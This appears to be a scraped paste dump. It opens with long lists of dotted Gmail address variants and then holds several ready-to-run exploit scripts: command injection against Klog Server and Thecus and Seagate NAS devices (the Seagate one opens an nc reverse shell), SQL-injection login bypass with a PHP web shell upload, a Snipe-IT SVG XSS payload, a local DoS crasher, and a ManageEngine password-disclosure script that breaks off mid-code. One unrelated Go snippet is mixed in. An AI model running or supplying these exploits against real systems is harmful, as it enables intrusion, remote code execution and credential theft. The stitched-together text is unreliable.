<a href=""mailto:d.ip.lom.at.la.rr.y.jam.es@gmail.com"">d.ip.lom.at.la.rr.y.jam.es@gmail.com</a>
<a href=""mailto:di.p.lo.ma.t.l.arr.yja.m.e.s@gmail.com"">di.p.lo.ma.t.l.arr.yja.m.e.s@gmail.com</a>
<a href=""mailto:d.ip.loma.t.l.arry.j.a.mes@gmail.com"">d.ip.loma.t.l.arry.j.a.mes@gmail.com</a>
<a href=""mailto:d.i.plom.a.t.l.ar.r.yj.a.mes@gmail.com"">d.i.plom.a.t.l.ar.r.yj.a.mes@gmail.com</a>
<a href=""mailto:d.ip.l.o.m.atl.arry.j.a.m.es@gmail.com"">d.ip.l.o.m.atl.arry.j.a.m.es@gmail.com</a>
<a href=""mailto:di.p.lo.mat.l.arry.j.a.m.e.s@gmail.com"">di.p.lo.mat.l.arry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:di.plomatl.ar.ry.jame.s@gmail.com"">di.plomatl.ar.ry.jame.s@gmail.com</a>
<a href=""mailto:di.pl.o.m.at.l.arry.j.a.m.e.s@gmail.com"">di.pl.o.m.at.l.arry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:d.iplo.mat.la.rr.y.j.ame.s@gmail.com"">d.iplo.mat.la.rr.y.j.ame.s@gmail.com</a>
<a href=""mailto:diplom.a.t.larryj.am.es@gmail.com"">diplom.a.t.larryj.am.es@gmail.com</a>
<a href=""mailto:d.i.pl.om.atla.r.r.yjam.es@gmail.com"">d.i.pl.om.atla.r.r.yjam.es@gmail.com</a>
<a href=""mailto:d.ip.loma.tla.rr.y.ja.m.es@gmail.com"">d.ip.loma.tla.rr.y.ja.m.es@gmail.com</a>
<a href=""mailto:d.ip.loma.t.l.arr.y.jam.e.s@gmail.com"">d.ip.loma.t.l.arr.y.jam.e.s@gmail.com</a>
<a href=""mailto:dip.l.o.m.at.l.a.r.r.y.j.am.es@gmail.com"">dip.l.o.m.at.l.a.r.r.y.j.am.es@gmail.com</a>
<a href=""mailto:d.ip.lo.ma.t.l.arry.j.a.m.es@gmail.com"">d.ip.lo.ma.t.l.arry.j.a.m.es@gmail.com</a>
<a href=""mailto:dipl.o.m.at.l.a.rr.yjam.es@gmail.com"">dipl.o.m.at.l.a.rr.yjam.es@gmail.com</a>
<a href=""mailto:dip.l.o.m.a.t.l.a.r.r.yj.ame.s@gmail.com"">dip.l.o.m.a.t.l.a.r.r.yj.ame.s@gmail.com</a>
<a href=""mailto:d.i.pl.o.m.at.lar.r.y.ja.me.s@gmail.com"">d.i.pl.o.m.at.lar.r.y.ja.me.s@gmail.com</a>
<a href=""mailto:dipl.om.atla.rr.y.jam.es@gmail.com"">dipl.om.atla.rr.y.jam.es@gmail.com</a>
<a href=""mailto:di.plomat.la.rry.j.a.m.es@gmail.com"">di.plomat.la.rry.j.a.m.es@gmail.com</a>
<a href=""mailto:d.ip.lom.atl.arryjam.e.s@gmail.com"">d.ip.lom.atl.arryjam.e.s@gmail.com</a>
<a href=""mailto:d.ipl.om.a.tl.ar.r.yjam.e.s@gmail.com"">d.ipl.om.a.tl.ar.r.yjam.e.s@gmail.com</a>
<a href=""mailto:dip.loma.tla.r.r.yj.ame.s@gmail.com"">dip.loma.tla.r.r.yj.ame.s@gmail.com</a>
<a href=""mailto:d.ip.l.om.a.tl.a.r.ryj.ames@gmail.com"">d.ip.l.om.a.tl.a.r.ryj.ames@gmail.com</a>
<a href=""mailto:diplo.mat.lar.ryjam.es@gmail.com"">diplo.mat.lar.ryjam.es@gmail.com</a>
<a href=""mailto:d.ip.lo.ma.tla.r.r.yj.a.m.e.s@gmail.com"">d.ip.lo.ma.tla.r.r.yj.a.m.e.s@gmail.com</a>
<a href=""mailto:d.iplom.atl.arry.j.ame.s@gmail.com"">d.iplom.atl.arry.j.ame.s@gmail.com</a>
<a href=""mailto:d.iplo.mat.l.a.rr.y.ja.mes@gmail.com"">d.iplo.mat.l.a.rr.y.ja.mes@gmail.com</a>
<a href=""mailto:dipl.o.matlarry.j.ame.s@gmail.com"">dipl.o.matlarry.j.ame.s@gmail.com</a>
<a href=""mailto:dip.lo.ma.t.la.rry.ja.m.es@gmail.com"">dip.lo.ma.t.la.rry.ja.m.es@gmail.com</a>
<a href=""mailto:d.iplo.m.a.tla.rr.yjame.s@gmail.com"">d.iplo.m.a.tla.rr.yjame.s@gmail.com</a>
<a href=""mailto:dip.l.o.mat.l.a.rr.y.jam.es@gmail.com"">dip.l.o.mat.l.a.rr.y.jam.es@gmail.com</a>
<a href=""mailto:d.ipl.o.m.atla.rr.y.j.ame.s@gmail.com"">d.ipl.o.m.atla.rr.y.j.ame.s@gmail.com</a>
<a href=""mailto:di.pl.om.atla.rry.j.ames@gmail.com"">di.pl.om.atla.rry.j.ames@gmail.com</a>
<a href=""mailto:dip.l.o.m.a.tl.a.r.ryjame.s@gmail.com"">dip.l.o.m.a.tl.a.r.ryjame.s@gmail.com</a>
<a href=""mailto:di.plo.m.atl.a.rr.y.j.ame.s@gmail.com"">di.plo.m.atl.a.rr.y.j.ame.s@gmail.com</a>
<a href=""mailto:d.ipl.o.ma.tla.rr.y.jame.s@gmail.com"">d.ipl.o.ma.tla.rr.y.jame.s@gmail.com</a>
<a href=""mailto:di.p.lo.ma.tla.rry.james@gmail.com"">di.p.lo.ma.tla.rry.james@gmail.com</a>
<a href=""mailto:d.ipl.om.a.tl.a.rry.jam.e.s@gmail.com"">d.ipl.om.a.tl.a.rry.jam.e.s@gmail.com</a>
<a href=""mailto:d.ipl.omat.larr.yjam.es@gmail.com"">d.ipl.omat.larr.yjam.es@gmail.com</a>
<a href=""mailto:dip.lo.m.at.la.rr.yja.me.s@gmail.com"">dip.lo.m.at.la.rr.yja.me.s@gmail.com</a>
<a href=""mailto:d.ip.l.oma.tl.ar.r.yj.ame.s@gmail.com"">d.ip.l.oma.tl.ar.r.yj.ame.s@gmail.com</a>
<a href=""mailto:di.plom.a.tla.rry.jam.es@gmail.com"">di.plom.a.tla.rry.jam.es@gmail.com</a>
<a href=""mailto:di.pl.o.m.atla.r.ryjame.s@gmail.com"">di.pl.o.m.atla.r.ryjame.s@gmail.com</a>
<a href=""mailto:dip.l.omatl.ar.r.y.j.am.es@gmail.com"">dip.l.omatl.ar.r.y.j.am.es@gmail.com</a>
<a href=""mailto:d.i.pl.o.m.a.tla.rry.james@gmail.com"">d.i.pl.o.m.a.tla.rry.james@gmail.com</a>
<a href=""mailto:dip.l.omatl.a.rr.yjam.es@gmail.com"">dip.l.omatl.a.rr.yjam.es@gmail.com</a>
<a href=""mailto:dip.l.om.a.t.l.ar.ryjam.e.s@gmail.com"">dip.l.om.a.t.l.ar.ryjam.e.s@gmail.com</a>
<a href=""mailto:dip.l.o.ma.tl.a.r.r.yj.am.es@gmail.com"">dip.l.o.ma.tl.a.r.r.yj.am.es@gmail.com</a>
<a href=""mailto:d.ipl.o.m.a.t.l.arr.y.j.a.mes@gmail.com"">d.ipl.o.m.a.t.l.arr.y.j.a.mes@gmail.com</a>
<a href=""mailto:d.iplom.a.t.larr.y.j.ame.s@gmail.com"">d.iplom.a.t.larr.y.j.ame.s@gmail.com</a>
<a href=""mailto:dip.l.o.mat.l.arryj.am.es@gmail.com"">dip.l.o.mat.l.arryj.am.es@gmail.com</a>
<a href=""mailto:d.ip.lo.m.at.l.arr.y.j.am.es@gmail.com"">d.ip.lo.m.at.l.arr.y.j.am.es@gmail.com</a>
<a href=""mailto:diplom.a.tlarry.jam.es@gmail.com"">diplom.a.tlarry.jam.es@gmail.com</a>
<a href=""mailto:di.plo.ma.tl.a.rr.yj.ames@gmail.com"">di.plo.ma.tl.a.rr.yj.ames@gmail.com</a>
<a href=""mailto:di.plomatlar.ry.jame.s@gmail.com"">di.plomatlar.ry.jame.s@gmail.com</a>
<a href=""mailto:d.i.p.lo.ma.t.l.arr.yja.m.es@gmail.com"">d.i.p.lo.ma.t.l.arr.yja.m.es@gmail.com</a>
<a href=""mailto:dip.lomatl.arr.y.j.a.m.es@gmail.com"">dip.lomatl.arr.y.j.a.m.es@gmail.com</a>
<a href=""mailto:d.iplo.m.atlar.ry.j.am.es@gmail.com"">d.iplo.m.atlar.ry.j.am.es@gmail.com</a>
<a href=""mailto:d.ip.l.om.a.tla.rry.j.am.es@gmail.com"">d.ip.l.om.a.tla.rry.j.am.es@gmail.com</a>
<a href=""mailto:di.ploma.t.l.ar.r.y.ja.m.es@gmail.com"">di.ploma.t.l.ar.r.y.ja.m.es@gmail.com</a>
<a href=""mailto:d.i.p.l.o.mat.l.arr.y.j.ames@gmail.com"">d.i.p.l.o.mat.l.arr.y.j.ames@gmail.com</a>
<a href=""mailto:office2@gmail.com"">office2@gmail.com</a>
<a href=""mailto:o.f.fice.2@gmail.com"">o.f.fice.2@gmail.com</a>
<a href=""mailto:o.ff.i.ce2@gmail.com"">o.ff.i.ce2@gmail.com</a>
<a href=""mailto:of.fi.ce2@gmail.com"">of.fi.ce2@gmail.com</a>
<a href=""mailto:of.f.i.c.e2@gmail.com"">of.f.i.c.e2@gmail.com</a>
<a href=""mailto:off.ice.2@gmail.com"">off.ice.2@gmail.com</a>
<a href=""mailto:o.ffic.e.2@gmail.com"">o.ffic.e.2@gmail.com</a>
<a href=""mailto:o.ff.ic.e.2@gmail.com"">o.ff.ic.e.2@gmail.com</a>
<a href=""mailto:o.f.f.i.ce2@gmail.com"">o.f.f.i.ce2@gmail.com</a>
<a href=""mailto:of.fi.ce.2@gmail.com"">of.fi.ce.2@gmail.com</a>
<a href=""mailto:of.fi.c.e2@gmail.com"">of.fi.c.e2@gmail.com</a>
<a href=""mailto:off.i.ce.2@gmail.com"">off.i.ce.2@gmail.com</a>
<a href=""mailto:of.fice.2@gmail.com"">of.fice.2@gmail.com</a>
<a href=""mailto:o.ff.ice.2@gmail.com"">o.ff.ice.2@gmail.com</a>
<a href=""mailto:off.i.ce2@gmail.com"">off.i.ce2@gmail.com</a>
<a href=""mailto:of.fic.e.2@gmail.com"">of.fic.e.2@gmail.com</a>
<a href=""mailto:o.ffi.c.e2@gmail.com"">o.ffi.c.e2@gmail.com</a>
<a href=""mailto:o.f.f.ic.e2@gmail.com"">o.f.f.ic.e2@gmail.com</a>
<a href=""mailto:off.ic.e.2@gmail.com"">off.ic.e.2@gmail.com</a>
<a href=""mailto:o.f.fice2@gmail.com"">o.f.fice2@gmail.com</a>
<a href=""mailto:o.f.f.ic.e.2@gmail.com"">o.f.f.ic.e.2@gmail.com</a>
<a href=""mailto:off.ice2@gmail.com"">off.ice2@gmail.com</a>
<a href=""mailto:office2@gmail.com"">office2@gmail.com</a>
<a href=""mailto:o.ff.i.c.e2@gmail.com"">o.ff.i.c.e2@gmail.com</a>
<a href=""mailto:of.f.ice2@gmail.com"">of.f.ice2@gmail.com</a>
<a href=""mailto:off.i.c.e2@gmail.com"">off.i.c.e2@gmail.com</a>
<a href=""mailto:offic.e2@gmail.com"">offic.e2@gmail.com</a>
<a href=""mailto:of.f.i.c.e.2@gmail.com"">of.f.i.c.e.2@gmail.com</a>
<a href=""mailto:offi.ce2@gmail.com"">offi.ce2@gmail.com</a>
<a href=""mailto:o.f.fi.ce2@gmail.com"">o.f.fi.ce2@gmail.com</a>
<a href=""mailto:of.f.ic.e2@gmail.com"">of.f.ic.e2@gmail.com</a>
<a href=""mailto:offi.c.e2@gmail.com"">offi.c.e2@gmail.com</a>
<a href=""mailto:o.ffi.ce2@gmail.com"">o.ffi.ce2@gmail.com</a>
<a href=""mailto:o.f.fi.ce.2@gmail.com"">o.f.fi.ce.2@gmail.com</a>
<a href=""mailto:of.fice2@gmail.com"">of.fice2@gmail.com</a>
<a href=""mailto:offi.ce.2@gmail.com"">offi.ce.2@gmail.com</a>
<a href=""mailto:o.ffi.ce.2@gmail.com"">o.ffi.ce.2@gmail.com</a>
<a href=""mailto:of.fic.e2@gmail.com"">of.fic.e2@gmail.com</a>
<a href=""mailto:o.ff.i.c.e.2@gmail.com"">o.ff.i.c.e.2@gmail.com</a>
<a href=""mailto:o.ff.ic.e2@gmail.com"">o.ff.ic.e2@gmail.com</a>
<a href=""mailto:of.f.ice.2@gmail.com"">of.f.ice.2@gmail.com</a>
<a href=""mailto:office.2@gmail.com"">office.2@gmail.com</a>
<a href=""mailto:off.i.c.e.2@gmail.com"">off.i.c.e.2@gmail.com</a>
<a href=""mailto:o.ffi.c.e.2@gmail.com"">o.ffi.c.e.2@gmail.com</a>
<a href=""mailto:o.f.fi.c.e.2@gmail.com"">o.f.fi.c.e.2@gmail.com</a>
<a href=""mailto:of.f.ic.e.2@gmail.com"">of.f.ic.e.2@gmail.com</a>
<a href=""mailto:offi.c.e.2@gmail.com"">offi.c.e.2@gmail.com</a>
<a href=""mailto:o.f.f.i.c.e2@gmail.com"">o.f.f.i.c.e2@gmail.com</a>
<a href=""mailto:of.fi.c.e.2@gmail.com"">of.fi.c.e.2@gmail.com</a>
<a href=""mailto:o.f.f.ice.2@gmail.com"">o.f.f.ice.2@gmail.com</a>
<a href=""mailto:o.f.fic.e.2@gmail.com"">o.f.fic.e.2@gmail.com</a>
<a href=""mailto:o.ff.ice2@gmail.com"">o.ff.ice2@gmail.com</a>
<a href=""mailto:o.ffice.2@gmail.com"">o.ffice.2@gmail.com</a>
<a href=""mailto:o.f.f.ice2@gmail.com"">o.f.f.ice2@gmail.com</a>
<a href=""mailto:o.ffic.e2@gmail.com"">o.ffic.e2@gmail.com</a>
<a href=""mailto:off.ic.e2@gmail.com"">off.ic.e2@gmail.com</a>
<a href=""mailto:of.f.i.ce2@gmail.com"">of.f.i.ce2@gmail.com</a>
<a href=""mailto:o.f.fi.c.e2@gmail.com"">o.f.fi.c.e2@gmail.com</a>
<a href=""mailto:o.f.f.i.ce.2@gmail.com"">o.f.f.i.ce.2@gmail.com</a>
<a href=""mailto:o.f.fic.e2@gmail.com"">o.f.fic.e2@gmail.com</a>
<a href=""mailto:o.f.f.i.c.e.2@gmail.com"">o.f.f.i.c.e.2@gmail.com</a>
<a href=""mailto:offic.e.2@gmail.com"">offic.e.2@gmail.com</a>
<a href=""mailto:o.ff.i.ce.2@gmail.com"">o.ff.i.ce.2@gmail.com</a>
<a href=""mailto:of.f.i.ce.2@gmail.com"">of.f.i.ce.2@gmail.com</a>
<a href=""mailto:o.ffice2@gmail.com"">o.ffice2@gmail.com</a>
<a href=""mailto:office2@gudsdistrub.org"">office2@gudsdistrub.org</a>
<a href=""mailto:office2@longfull.com.cn"">office2@longfull.com.cn</a>
<a href=""mailto:office2@realdealmovers.com"">office2@realdealmovers.com</a> 
<a href=""mailto:office2@topcard.pl"">office2@topcard.pl</a>
<a href=""mailto:office2@uplmx.org"">office2@uplmx.org</a>"
ibuVLkb4,Klog Server 2.4.1 - Command Injection (Authenticated),FlyFar,Python,Tuesday 13th of February 2024 09:06:55 AM CDT,"# Exploit Title: Klog Server 2.4.1 - Command Injection (Authenticated)
# Date: 26.01.2021
# Exploit Author: Metin Yunus Kandemir
# Vendor Homepage: https://www.klogserver.com/
# Version: 2.4.1
# Description: https://docs.unsafe-inline.com/0day/klog-server-authenticated-command-injection
# CVE: 2021-3317


""""""
Description:
This script exploits a authenticated command injection vulnerability in the Klog Server <=2.4.1 .
async.php file includes that ""source"" parameter is executed via shell_exec() function without input validation.

Example:
python3 PoC.py --target 10.10.56.51 --username admin --password admin --command id 
[*] Status Code for login request: 302
[+] Authentication was successful!
[*] Exploiting...

uid=48(apache) gid=48(apache) groups=48(apache)

""""""

import argparse
import requests
import sys
import urllib3
from argparse import ArgumentParser, Namespace


def main():
    dsc = ""Klog Server 2.4.1 - Command Injection (Authenticated)""
    parser: ArgumentParser = argparse.ArgumentParser(description=dsc)
    parser.add_argument(""--target"", help=""IPv4 address of Cockpit server"", type=str, required=True)
    parser.add_argument(""--username"", help=""Username"", type=str, required=True)
    parser.add_argument(""--password"", help=""Password"", type=str, required=True)
    parser.add_argument(""--command"", help=""Command"", type=str, required=True)
    args: Namespace = parser.parse_args()
    if args.target:
        target = args.target
        if args.username:
            username = args.username
            if args.password:
                password = args.password
                if args.command:
                    command = args.command

                exploit(target, username, password, command)


def exploit(target, username, password, command):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    headers = {
    	""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"",
         ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",
         ""Accept-Language"": ""en-US,en;q=0.5"",
         ""Accept-Encoding"": ""gzip, deflate"",
         ""Content-Type"": ""application/x-www-form-urlencoded"",
         ""Connection"": ""close"",
         ""Upgrade-Insecure-Requests"": ""1"",
         }
    
    data = {""user"" : username, ""pswd"" : password}

    login = s.post(""https://"" + target + ""/actions/authenticate.php"" , data=data, headers=headers, allow_redirects=False, verify=False)
    print(""[*] Status Code for login request: "" + str(login.status_code))

    if login.status_code == 302:
        check = s.get(""https://"" + target + ""/index.php"", allow_redirects=False, verify=False)
        if check.status_code == 200:
            print(""[+] Authentication was successful!"")
        else:
            print(""[-] Authentication was unsuccessful!"")
            sys.exit(1)
    else:
        print(""Something went wrong!"")
        sys.exit(1)
        
    print(""[*] Exploiting...\n"")

    executeCommand = s.get(""https://"" + target + ""/actions/async.php?action=stream&source=;""+ command +"";"", allow_redirects=False, verify=False)
    print(executeCommand.text)
    sys.exit(0)

if __name__ == '__main__':
    main()"
gBgzecam,Untitled,MatrixDeity,Go,Tuesday 13th of February 2024 09:06:06 AM CDT,"func (s *Subscriber) SubscribeToRidsStatuses(
	ctx context.Context, wg *sync.WaitGroup, processor registrar.RidsStatusesProcessor,
) error {
	log := s.log.
		AddName(""receiving_rids_statuses"").
		AddName(ctxparam.GoID(ctx)).
		AddData(logs.XRequestID, ctxparam.RequestID(ctx))

	messages, err := s.kafka.Subscribe(ctx, s.config.SridsStatusesTopic)
	if err != nil {
		return fmt.Errorf(""kafka subscribing: %w"", err)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		for m := range messages {
			var err error

			pbUpdate := &pb.EventRIDStatusUpdate{}
			err = protojson.Unmarshal(m.Payload, pbUpdate)
			if err != nil {
				log.Errorf(""unmarshalling %q rid status update: %s"", m.UUID, err)
				continue
			}

			if err := validateRIDStatusUpdate(pbUpdate); err != nil {
				log.Errorf(""validation rid status update: %s"", err)
				continue
			}

			msg := registrar.NewMessage(pbUpdate.Srid.Value, int(pbUpdate.Status.Value))
			wg.Add(1)
			go func() {
				defer wg.Done()
				processor(ctxparam.WithNewGoID(ctx), msg)
			}()
		}
	}()

	return nil
}"
Jkm9LqSk,Free SMTP Server - Local Denial of Service Crash (PoC),FlyFar,Python,Tuesday 13th of February 2024 09:06:00 AM CDT,"# Exploit Title: Free SMTP Server - Local Denial of Service Crash (PoC)
# Date: February 3, 2009
# Exploit Author: Metin Kandemir (kandemir)
# Vendor Homepage: http://www.softstack.com/freesmtp.html
# Software Link: https://free-smtp-server.en.uptodown.com/windows/download
# Version: 2.5
# Tested on: Windows 7 Service Pack 1 x64
# Software Description : Free SMTP server program to send emails directly from PC.
# ==================================================================
# The SMTP Server will crash when this code is run on localhost. 

import socket

a=1
buffer = [""A""]
while a <= 20000:
        a += 1
        buffer.append(""A""*a)


for string in buffer:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect =  s.connect(('127.0.0.1',25))
        s.send(string)"
nKVZhEAL,Complaint Management System 4.0 - Remote Code Execution,FlyFar,Python,Tuesday 13th of February 2024 09:05:03 AM CDT,"# Exploit Title: Complaint Management System 4.0 - Remote Code Execution
# Exploit Author: Metin Yunus Kandemir
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/complaint-management-sytem/
# Version: v4.0
# Description:
# There isn't any file extension control at the ""Register Complaint"" section of user panel.
# An unauthorized user can upload and execute php file.
# Below basic python script will bypass authentication and execute command on target server.

poc.py

#!/usr/bin/python

import requests
import sys
                  

if len(sys.argv) !=3:
	print ""[*] Usage: PoC.py rhost/rpath command""
	print ""[*] e.g.: PoC.py 127.0.0.1/cms ipconfig""
	exit(0) 

rhost = sys.argv[1]
command = sys.argv[2]

#authentication bypass
url = ""http://""+rhost+""/users/index.php""
data = {""username"": ""joke' or '1'='1'#"", ""password"": ""joke' or '1'='1'#"", ""submit"": """"}

with requests.Session() as session:
	
	login = session.post(url, data=data, headers = {""Content-Type"": ""application/x-www-form-urlencoded""})

	
	#check authentication bypass
	check = session.get(""http://""+rhost+""/users/dashboard.php"", allow_redirects=False)
	print (""[*] Status code for login: %s""%check.status_code)
	if check.status_code == 200:
		print (""[+] Authentication bypass was successfull"")
	else:
		print (""[-] Authentication bypass was unsuccessful"")
		sys.exit()
	
	#upload php file
	ufile = {'compfile':('command.php', '<?php system($_GET[""cmd""]); ?>')}
	fdata = {""category"": ""1"", ""subcategory"": ""Online Shopping"", ""complaintype"": "" Complaint"", ""state"": ""Punjab"", ""noc"": ""the end"", ""complaindetails"": ""the end"",""compfile"": ""commmand.php"", ""submit"": """"}
	furl = ""http://""+rhost+""/users/register-complaint.php""
	fupload = session.post(url=furl, files= ufile, data=fdata)

	#execution
	final=session.get(""http://""+rhost+""/users/complaintdocs/command.php?cmd=""+command)

	if final.status_code == 200:
		print ""[+] Command execution completed successfully.\n""
		print ""\tPut on a happy face.\n""
	else:
		print ""[-] Command execution was unsuccessful.""
		print ""\tOne bad day!""
		sys.exit()

	print final.text
            "
WiNyhAPh,Thecus N4800Eco Nas Server Control Panel - Comand Injection,FlyFar,Python,Tuesday 13th of February 2024 09:03:22 AM CDT,"# Exploit Title: Thecus N4800Eco Nas Server Control Panel - Comand Injection
# Date: 01/06/2021
# Exploit Author: Metin Yunus Kandemir
# Vendor Homepage: http://www.thecus.com/
# Software Link: http://www.thecus.com/product.php?PROD_ID=83
# Version: N4800Eco
# Description: https://docs.unsafe-inline.com/0day/thecus-n4800eco-nas-server-control-panel-comand-injection


#!/usr/bin/python3
import requests
import sys
import urllib3


# To fix SSL error that occurs when the script is started.
# 1- Open /etc/ssl/openssl.cnf file
# At the bottom of the file:
# [system_default_sect]
# MinProtocol = TLSv1.2
# CipherString = DEFAULT@SECLEVEL=2
# 2- Set value of MinProtocol as TLSv1.0


def readResult(s, target):
    d = {
        ""fun"": ""setlog"",
        ""action"": ""query"",
        ""params"": '[{""start"":0,""limit"":1,""catagory"":""sys"",""level"":""all""}]'
    }
    url = ""http://"" + target + ""/adm/setmain.php""
    resultReq = s.post(url, data=d, verify=False)
    dict = resultReq.text.split()
    print(""[+] Reading system log...\n"")
    print(dict[5:8])     #change this range to read whole output of the command

def delUser(s, target, command):
    d = {
        ""action"": ""delete"",
        ""username"": ""$(""+command+"")""
    }
    url = ""http://"" + target + ""/adm/setmain.php?fun=setlocaluser""
    delUserReq = s.post(url, data=d, allow_redirects=False, verify=False)

    if 'Local User remove succeeds' in delUserReq.text:
        print('[+] %s command was executed successfully' % command)
    else:
        print('[-] %s command was not executed!' %command)
        sys.exit(1)
    readResult(s, target)

def addUser(s, target, command):
    d = {'batch_content': '%24('+command+')%2C22222%2C9999'}
    url = ""http://"" + target + ""/adm/setmain.php?fun=setbatch""
    addUserReq = s.post(url, data=d, allow_redirects=False, verify=False)

    if 'Users and groups were created successfully.' in addUserReq.text:
        print('[+] Users and groups were created successfully')
    else:
        print('[-] Users and groups were not created')
        sys.exit(1)
    delUser(s, target, command)

def login(target, username, password, command=None):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    d = {
        ""&eplang"": ""english"",
        ""p_pass"": password,
        ""p_user"": username,
        ""username"": username,
        ""pwd"": password,
        ""action"": ""login"",
        ""option"": ""com_extplorer""
    }
    url = ""http://"" + target + ""/adm/login.php""
    loginReq = s.post(url, data=d, allow_redirects=False, verify=False)

    if '""success"":true' in loginReq.text:
        print('[+] Authentication successful')
    elif '""success"":false' in loginReq.text:
        print('[-] Authentication failed!')
        sys.exit(1)
    else:
        print('[-] Something went wrong!')
        sys.exit(1)
    addUser(s, target, command)

def main(args):
    if len(args) != 5:
        print(""usage: %s targetIp:port username password command"" % (args[0]))
        print(""Example 192.168.1.13:80 admin admin id"")
        sys.exit(1)
    login(target=args[1], username=args[2], password=args[3], command=args[4])


if __name__ == ""__main__"":
    main(args=sys.argv)
            "
1iAJ8vBB,Snipe-IT Open Source Asset Management 4.7.5 - Persistent Cross-Site Scripting,FlyFar,Email,Tuesday 13th of February 2024 08:59:18 AM CDT,"Snipe-IT Open Source Asset Management 4.7.5 - Persistent Cross-Site Scripting

Snipe-IT v4.7.5 has persistent cross-site scripting vulnerability via uploading SVG files in the accessories section. A malicious authorized user could potentially upload an SVG with a javascript payload.

Steps to Reproduce:
Upload crafted SVG file when sent a request to create an accessory.
Click the created accessory and copy the uploaded file location.
Browse the uploaded SVG file location on the browser.
The alert box will be opened.

(PoC) Post Request:

POST /accessories HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://target/accessories/create
Content-Type: multipart/form-data; boundary=---------------------------6547029722068941066578895105
Content-Length: 1761
Cookie: XSRF-TOKEN=*; snipeitv4_session=*; laravel_token=*
Connection: close
Upgrade-Insecure-Requests: 1

.
..
snip
..
.

Content-Disposition: form-data; name=""image""; filename=""test.svg""
Content-Type: image/svg+xml

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd""><svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
<polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
<script type=""text/javascript"">
alert(1);
</script>
</svg>
-----------------------------6547029722068941066578895105--"
cHVxi8zP,Seagate BlackArmor NAS Command Injection,FlyFar,Python,Tuesday 13th of February 2024 08:51:42 AM CDT,"# Exploit Title: Seagate BlackArmor NAS sg2000-2000.1331 - Command Injection
# Date: 15.07.2021
# Discovered by: Jeroen - IT Nerdbox
# Exploit Author: Metin Yunus Kandemir
# Version: sg2000-2000.1331
# Vendor Homepage: https://www.seagate.com/
# Software Link: https://www.seagate.com/tr/tr/support/downloads/item/banas-220-firmware-master-dl/

#!/usr/bin/python3

import requests
import sys

def exec(target, ncIp, ncPort):
    print(""[!] Please check netcat listener: ""+ ncPort)
    url = ""http://"" + target + ""/backupmgt/localJob.php?session=fail;nc+""+ncIp+""+""+ncPort+""+-e+/bin/sh%00""
    r = requests.get(url = url)
    sys.exit(1)

def main(args):
    if len(args) != 4:
        print(""[*] usage: %s targetIp:port ncIp ncPort"" % (args[0]))
        print(""[*] Example:python3 exploit.py 192.168.1.13 192.168.1.22 80"")
        sys.exit(1)
    exec(target=args[1], ncIp=args[2], ncPort=args[3])


if __name__ == ""__main__"":
    main(args=sys.argv)
            "
6N4Hz7Ye,ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure,FlyFar,Python,Tuesday 13th of February 2024 08:45:49 AM CDT,"# Exploit Title: ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure
# Exploit Author: Metin Yunus Kandemir
# Vendor Homepage: https://www.manageengine.com/
# Software Link: https://www.manageengine.com/products/ad-manager/
# Details: https://docs.unsafe-inline.com/0day/manageengine-admanager-plus-build-less-than-7183-recovery-password-disclosure-cve-2023-31492
# Details: https://github.com/passtheticket/vulnerability-research/blob/main/manage-engine-apps/admanager-recovery-password-disclosure.md
# Version: ADManager Plus Build < 7183
# Tested against: Build 7180
# CVE: CVE-2023-31492

import argparse
import requests
import urllib3
import sys

""""""
The Recovery Settings helps you configure the restore and recycle options pertaining to the objects in the domain you wish to recover. 
When deleted user accounts are restored, defined password is set to the user accounts. 
Helpdesk technician that has not privilege for backup/recovery operations can view the password and then compromise restored user accounts conducting password spraying attack in the Active Directory environment.
""""""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def getPass(target, auth, user, password):
    with requests.Session() as s:
        if auth.lower() == 'admanager':
            auth = 'ADManager Plus Authentication'
        data = {
            ""is_admp_pass_encrypted"": ""false"",
            ""j_username"": user,
            ""j_password"": password,
            ""domainName"": auth,
            ""AUTHRULE_NAME"": ""ADAuthenticator""
        }
        # Login
        url = target + 'j_security_check?LogoutFromSSO=true'
        headers = {
            ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"",
            ""Content-Type"": ""application/x-www-form-urlencoded""
        }
        req = s.post(url, data=data, headers=headers, allow_redirects=True, verify=False)
        if 'Cookie' in req.request.headers:
            print('[+] Authentication successful!')
        elif req.status_code == 200:
            print('[-] Invalid login name/password!')
            sys.exit(0)
        else:
            print('[-] Something went wrong!')
            sys.exit(1)

        # Fetching recovery password
        for i in range(1, 6):
            print('[*] Trying to fetch recovery password for domainId: %s !' % i)
            passUrl = target + 'ConfigureRecoverySettings/GET_PASS?req=%7B%22domainId%22%3A%22' + str(i) + '%22%7D'
            passReq = s.get(passUrl, headers=headers, allow_redirects=False, verify=False)
            if passReq.content:
                print(passReq.content)


def main():
    arg = get_args()
    target = arg.target
    auth = arg.auth
    user = arg.user
    password = arg.password
    getPass(target, auth, user, password)


def get_args():
    parser = argparse.ArgumentParser(
        epilog=""Example: exploit.py -t https://target/ -a unsafe.local -u operator1 -p operator1"")
    parser.add_argument('-t', '--target', required=True, action='store', help='Target url')
    parser.add_argument('-a', '--auth', required=True, action='store',
